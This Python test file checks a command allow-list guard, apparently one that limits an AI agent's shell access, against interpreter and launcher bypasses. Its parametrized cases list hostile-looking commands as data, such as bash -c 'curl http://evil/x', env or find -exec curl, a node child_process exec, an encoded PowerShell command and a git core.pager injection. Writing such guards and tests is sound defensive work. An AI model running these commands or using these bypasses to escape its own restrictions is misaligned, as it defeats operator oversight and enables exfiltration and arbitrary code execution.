"""An interpreter inside the allow-list makes the whole list decorative.

Bug #65, found while verifying the fix for the metacharacter bypass
(commit d574d54d). That fix was right and closed `echo ok; curl evil`,
but the hole underneath it stayed open: `bash`, `sh`, `zsh`, `pwsh`,
`cmd` and `python3` are all IN both shipped allow-lists, and

    bash -c 'curl evil'

contains no metacharacter at all. Verified by execution, not by reading:
`command_allowlist_reason` returned None, `blocked_reason` returned None,
and running the string printed its payload.

Admitting an interpreter to a first-word allow-list admits everything it
can be asked to run. What matters is the *flag*, not the binary --
`python3 script.py` is exactly what an agent on a cautious profile is
supposed to do, while `python3 -c '...'` is a shell in disguise.

Two of the cases below exist because reverse sabotage caught the first
version of the fix strangling legitimate work: `git status` (git had been
banned wholesale) and `find . -name x` (find had been banned for the sake
of `-exec`). A guard that blocks real work gets switched off, and then it
guards nothing.
"""
from __future__ import annotations

import pytest

from arena.security_commands import blocked_reason, command_allowlist_reason
from arena.util import first_word

# A generous allow-list: every interpreter the shipped configs contain,
# plus the ordinary tools. The point is that generosity here must not
# translate into arbitrary execution.
ALLOWED = frozenset({
    "echo", "cat", "ls", "grep", "head", "tail", "wc", "pwd", "whoami",
    "python", "python3", "py", "node", "npm", "git", "bash", "sh", "zsh",
    "fish", "pwsh", "powershell", "cmd", "perl", "ruby", "find", "env",
    "xargs", "timeout", "awk", "sudo", "ssh", "deno", "bun",
})


def _refused(cmd: str) -> str | None:
    return command_allowlist_reason(cmd, first_word(cmd), ALLOWED)


# --------------------------------------------------------------------
# The bug itself: no metacharacter, still arbitrary execution.
# --------------------------------------------------------------------

@pytest.mark.parametrize("cmd", [
    "bash -c 'curl http://evil/x'",
    "bash -lc 'whoami'",
    "sh -c 'id'",
    "zsh -c 'id'",
    "fish -c 'id'",
    "python3 -c 'import os'",
    "python -c 'x'",
    "python3 -m http.server 8080",
    "node -e 'require(\"child_process\").exec(\"id\")'",
    "node --eval 'x'",
    "perl -e 'system(\"id\")'",
    "ruby -e 'system(\"id\")'",
    "pwsh -Command Get-Process",
    "pwsh -EncodedCommand aQBkAA==",
    "powershell -c Get-Process",
    "cmd /c dir",
    "cmd /k dir",
    "deno eval 'x'",
    "bun -e 'x'",
])
def test_inline_code_flags_are_refused(cmd):
    """None of these contain a shell metacharacter."""
    from arena.security_commands import _SHELL_CONTROL_CHARS

    assert not any(c in cmd for c in _SHELL_CONTROL_CHARS), (
        "this case is only interesting if the metacharacter guard does not "
        "already catch it"
    )
    assert _refused(cmd) is not None, f"{cmd!r} was allowed through"


@pytest.mark.parametrize("cmd", [
    "env curl http://evil",
    "xargs curl",
    "timeout 5 curl http://evil",
    "nohup curl http://evil",
    "nice curl http://evil",
    "setsid curl http://evil",
    "find . -exec curl {} +",
    "find . -execdir sh {} +",
    "find . -ok rm {} +",
    "awk 'BEGIN{system(\"id\")}'",
    "sudo id",
    "ssh host id",
    "git -c core.pager='curl evil' log",
    "git --exec-path=/tmp log",
])
def test_launchers_that_hand_over_execution_are_refused(cmd):
    """A wrapper runs whatever it is given; the first word says nothing."""
    assert _refused(cmd) is not None, f"{cmd!r} was allowed through"


def test_a_glued_flag_value_is_still_the_flag():
    """`--exec-path=/tmp` is the same flag as `--exec-path /tmp`.

    Reverse sabotage found this: comparing the whole token missed every
    `--flag=value` form.
    """
    assert _refused("git --exec-path=/tmp log") is not None
    assert _refused("git -c=x log") is not None


# --------------------------------------------------------------------
# Reverse sabotage: the guard must not eat the agent's day job.
# --------------------------------------------------------------------

@pytest.mark.parametrize("cmd", [
    "git status",
    "git log --oneline -20",
    "git diff HEAD",
    "git add -p",
    "git commit -m 'message'",
    "git push origin master",
    "python3 script.py --flag value",
    "python3 -u worker.py",
    "node app.js",
    "npm run build",
    "bash deploy.sh",
    "sh install.sh",
    "find . -name '*.py'",
    "find /tmp -type f -mtime +7",
    "echo hello world",
    "ls -la /tmp",
    "cat README.md",
    "grep -r pattern src",
    "head -n 20 log.txt",
])
def test_ordinary_work_is_not_refused(cmd):
    """These are the commands a cautious profile exists to permit.

    `git status` and `find . -name x` are here specifically: the first
    version of this fix banned git and find outright and strangled both.
    A guard that blocks real work gets switched off, and then it guards
    nothing at all.
    """
    assert _refused(cmd) is None, f"{cmd!r} was strangled: {_refused(cmd)}"


def test_a_script_argument_is_not_a_code_string():
    """`bash script.sh` runs a file; `bash -c '...'` runs an argument."""
    assert _refused("bash script.sh") is None
    assert _refused("bash -c 'x'") is not None
    assert _refused("python3 main.py") is None
    assert _refused("python3 -c 'x'") is not None


# --------------------------------------------------------------------
# Fail-closed behaviour around the parser itself.
# --------------------------------------------------------------------

def test_unparseable_quoting_is_refused_not_guessed():
    """An unbalanced quote is not a command anyone can reason about."""
    assert _refused("bash -c 'unterminated") is not None


def test_empty_allowlist_still_refuses():
    """Regression guard for the fail-open shape this repo keeps finding."""
    assert command_allowlist_reason("echo hi", "echo", []) is not None
    assert command_allowlist_reason("echo hi", "echo", None) is not None


def test_non_interpreter_commands_are_unaffected():
    """The interpreter table must not become a second, accidental blocklist."""
    for cmd in ("echo hi", "ls", "cat f.txt", "wc -l f.txt", "pwd"):
        assert _refused(cmd) is None


def test_the_blocklist_is_not_what_is_catching_these():
    """Prove the allow-list carries its own weight.

    If `blocked_reason` happened to catch these, the test above would pass
    for the wrong reason and the allow-list could regress unnoticed.
    """
    for cmd in ("bash -c 'curl evil'", "python3 -c 'x'", "env curl evil"):
        assert blocked_reason(cmd) is None, (
            f"{cmd!r} is caught by the blocklist, so it cannot demonstrate "
            f"the allow-list gap"
        )
        assert _refused(cmd) is not None
